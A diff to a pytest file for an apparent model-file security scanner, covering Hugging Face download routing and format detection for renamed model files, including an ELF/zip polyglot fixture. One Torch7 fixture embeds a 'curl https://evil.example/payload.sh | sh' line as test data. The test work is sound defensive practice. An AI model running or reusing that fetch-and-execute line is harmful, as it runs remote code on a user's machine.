@@ -4,6 +4,7 @@ import importlib
 import pickle
 import struct
 import tarfile
+import zipfile
 from collections.abc import Callable, Iterator
 from io import BytesIO
 from pathlib import Path
@@ -13,6 +14,7 @@ from unittest.mock import ANY, MagicMock, patch
 
 import pytest
 
+from modelaudit.utils.file.detection import detect_file_format_for_skip_filter
 from modelaudit.utils.sources.huggingface import (
     _list_repo_files_with_timeout,
     download_file_from_hf,
@@ -59,6 +61,13 @@ def _make_tar_payload() -> bytes:
         info.mtime = 0
         archive.addfile(info, BytesIO(b"weights"))
     return payload.getvalue()
+
+
+def _make_executable_zip_polyglot_payload() -> bytes:
+    payload = BytesIO()
+    with zipfile.ZipFile(payload, "w") as archive:
+        archive.writestr("model.pkl", b"payload")
+    return b"\x7fELF" + b"\x02\x01\x01\x00" + (b"\x00" * 56) + payload.getvalue()
 
 
 def _ubjson_key(key: bytes) -> bytes:
@@ -549,6 +558,7 @@ class TestModelDownload:
         assert allow_patterns == ["pytorch_model.bin", "evil.payload"]
         assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
         assert all(f"/resolve/{_HF_TEST_REVISION}/" in call.args[0] for call in mock_requests_get.call_args_list)
+        assert all(call.kwargs["headers"]["Accept-Encoding"] == "identity" for call in mock_requests_get.call_args_list)
 
     @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
     @patch(
@@ -573,6 +583,7 @@ class TestModelDownload:
         mock_requests_get.return_value = _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
 
         assert download_model("https://huggingface.co/test/model") == download_path
+        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == "tflite"
 
     @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
     @patch(
@@ -597,31 +608,42 @@ class TestModelDownload:
             download_model("https://huggingface.co/test/model")
 
     @pytest.mark.parametrize(
-        "payload",
+        "payload, expected_format",
         [
-            struct.pack("<Q", len(b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'))
-            + b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'
-            + b"\x00\x00\x00\x00",
-            pickle.dumps({"weights": [1, 2, 3]}, protocol=0),
-            _make_tar_payload(),
-            b"\x0a\x07version\x0a\x03uidCompositeFunction",
+            (
+                struct.pack("<Q", len(b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'))
+                + b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'
+                + b"\x00\x00\x00\x00",
+                "safetensors",
+            ),
+            (pickle.dumps({"weights": [1, 2, 3]}, protocol=0), "pickle"),
+            (_make_tar_payload(), "tar"),
+            (b"\x0a\x07version\x0a\x03uidCompositeFunction", "cntk"),
             (
                 b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
-                b"max_feature_idx=0\ntree=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n"
+                b"max_feature_idx=0\ntree=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n",
+                "lightgbm",
             ),
-            b'<?xml version="1.0" encoding="UTF-8"?><PMML version="4.4"></PMML>',
-            b'{"orbax_version":"1.0","framework":"jax"}',
-            _make_xgboost_ubjson_payload(),
-            b'{"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
-            b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00",
-            b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
-            b"\xdb" + (9000).to_bytes(4, "big") + b"x" * 9000 + b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
+            (b'<?xml version="1.0" encoding="UTF-8"?><PMML version="4.4"></PMML>', "pmml"),
+            (b'{"orbax_version":"1.0","framework":"jax"}', "jax_checkpoint"),
+            (
+                b'{"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+                "mxnet",
+            ),
+            (b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00", "executorch"),
+            (b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03", "flax_msgpack"),
+            (
+                b"\xdb" + (9000).to_bytes(4, "big") + b"x" * 9000 + b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
+                "flax_msgpack",
+            ),
             (
                 b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
                 b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
-                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n",
+                "torch7",
             ),
-            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n",
+            (b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n", "llamafile"),
+            (_make_executable_zip_polyglot_payload(), "executable_zip_polyglot"),
         ],
         ids=[
             "safetensors",
@@ -631,13 +653,13 @@ class TestModelDownload:
             "lightgbm",
             "pmml-xml",
             "jax-json",
-            "xgboost-ubjson",
             "mxnet",
             "executorch",
             "flax-msgpack",
             "flax-msgpack-delayed-root",
             "torch7",
             "llamafile",
+            "executable-zip-polyglot",
         ],
     )
     @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
@@ -655,6 +677,7 @@ class TestModelDownload:
         _mock_get_extensions: MagicMock,
         tmp_path: Path,
         payload: bytes,
+        expected_format: str,
     ) -> None:
         """Selective downloads should preserve renamed payloads recognized by bounded probes."""
         download_path = tmp_path / "download"
@@ -668,13 +691,101 @@ class TestModelDownload:
 
         assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
         assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
+        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == expected_format
+
+    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
+    @patch(
+        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
+        return_value=(["pytorch_model.bin", "model"], _HF_TEST_REVISION, None),
+    )
+    @patch("requests.get")
+    @patch("huggingface_hub.snapshot_download")
+    def test_download_model_includes_extensionless_xgboost_ubjson(
+        self,
+        mock_snapshot_download: MagicMock,
+        mock_requests_get: MagicMock,
+        _mock_list_repo_files: MagicMock,
+        _mock_get_extensions: MagicMock,
+        tmp_path: Path,
+    ) -> None:
+        """Extensionless XGBoost UBJSON should survive remote and local routing."""
+        payload = _make_xgboost_ubjson_payload()
+        download_path = tmp_path / "download"
+        download_path.mkdir()
+        (download_path / "pytorch_model.bin").write_bytes(b"weights")
+        xgboost_path = download_path / "model"
+        xgboost_path.write_bytes(payload)
+        mock_snapshot_download.return_value = str(download_path)
+        mock_requests_get.return_value = _FakeRangeResponse(payload)
+
+        download_model("https://huggingface.co/test/model")
+
+        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "model"]
+        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
+        assert detect_file_format_for_skip_filter(str(xgboost_path)) == "xgboost"
+
+    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
+    @patch(
+        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
+        return_value=(["pytorch_model.bin", "model.payload"], _HF_TEST_REVISION, None),
+    )
+    @patch("requests.get")
+    @patch("huggingface_hub.snapshot_download")
+    def test_download_model_skips_suffixed_xgboost_ubjson(
+        self,
+        mock_snapshot_download: MagicMock,
+        mock_requests_get: MagicMock,
+        _mock_list_repo_files: MagicMock,
+        _mock_get_extensions: MagicMock,
+        tmp_path: Path,
+    ) -> None:
+        """Remote routing should match the extensionless-only local XGBoost contract."""
+        payload = _make_xgboost_ubjson_payload()
+        download_path = tmp_path / "download"
+        download_path.mkdir()
+        (download_path / "pytorch_model.bin").write_bytes(b"weights")
+        mock_snapshot_download.return_value = str(download_path)
+        mock_requests_get.return_value = _FakeRangeResponse(payload)
+
+        download_model("https://huggingface.co/test/model")
+
+        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]
+        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
+
+    @pytest.mark.parametrize("filename", ["checkpoint.py", "checkpoint.pyw"])
+    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
+    @patch("requests.get")
+    @patch("huggingface_hub.snapshot_download")
+    def test_download_model_skips_jax_json_source_files(
+        self,
+        mock_snapshot_download: MagicMock,
+        mock_requests_get: MagicMock,
+        _mock_get_extensions: MagicMock,
+        filename: str,
+        tmp_path: Path,
+    ) -> None:
+        """Remote JAX routing should preserve the local source-file exclusions."""
+        payload = b'{"orbax_version":"1.0","framework":"jax"}'
+        with patch(
+            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
+            return_value=(["pytorch_model.bin", filename], _HF_TEST_REVISION, None),
+        ):
+            download_path = tmp_path / "download"
+            download_path.mkdir()
+            (download_path / "pytorch_model.bin").write_bytes(b"weights")
+            mock_snapshot_download.return_value = str(download_path)
+            mock_requests_get.return_value = _FakeRangeResponse(payload)
+
+            download_model("https://huggingface.co/test/model")
+
+        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]
 
     @pytest.mark.parametrize(
-        "payload_factory",
+        "payload_factory, expected_format",
         [
-            _make_tensorflow_savedmodel_payload,
-            _make_coreml_payload,
-            _make_onnx_payload,
+            (_make_tensorflow_savedmodel_payload, "tf_savedmodel"),
+            (_make_coreml_payload, "coreml"),
+            (_make_onnx_payload, "onnx"),
         ],
         ids=["tensorflow-protobuf", "coreml-protobuf", "onnx-protobuf"],
     )
@@ -693,6 +804,7 @@ class TestModelDownload:
         _mock_get_extensions: MagicMock,
         tmp_path: Path,
         payload_factory: Callable[[Path], bytes],
+        expected_format: str,
     ) -> None:
         """Selective downloads should preserve renamed framework protobuf payloads."""
         payload = payload_factory(tmp_path)
@@ -707,11 +819,13 @@ class TestModelDownload:
 
         assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
         assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
+        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == expected_format
 
     @pytest.mark.parametrize(
         "payload",
         [
             struct.pack("<Q", 4) + b"\x00" * 8,
+            struct.pack("<Q", (16 * 1024 * 1024) + 1) + b"{" + b"\x00" * 7,
             b"\x0a\x07version\x0a\x03uid",
             (
                 b"tree implementation notes\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
@@ -722,6 +836,7 @@ class TestModelDownload:
             b"{" + _ubjson_key(b"learner") + b"{}" + _ubjson_key(b"metadata") + b"{}" + b"}",
             b'{"nodes":[{"op":"Custom"}],"arg_nodes":[],"heads":[[0,0,0]]}',
             b"\x0c\x00\x00\x00ETAA\x04\x00\x04\x00\x04\x00\x00\x00",
+            b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x00\x00\x00\x00",
             b"\x81\xa8metadata\xa4safe",
             b"import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n",
             b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime",
@@ -732,6 +847,7 @@ class TestModelDownload:
         ],
         ids=[
             "malformed-safetensors",
+            "truncated-oversized-safetensors",
             "cntk-notes",
             "lightgbm-notes",
             "xml-notes",
@@ -739,6 +855,7 @@ class TestModelDownload:
             "xgboost-ubjson-near-match",
             "mxnet-notes",
             "executorch-near-match",
+            "executorch-invalid-flatbuffer",
             "flax-msgpack-near-match",
             "torch7-source-near-match",
             "llamafile-near-match",
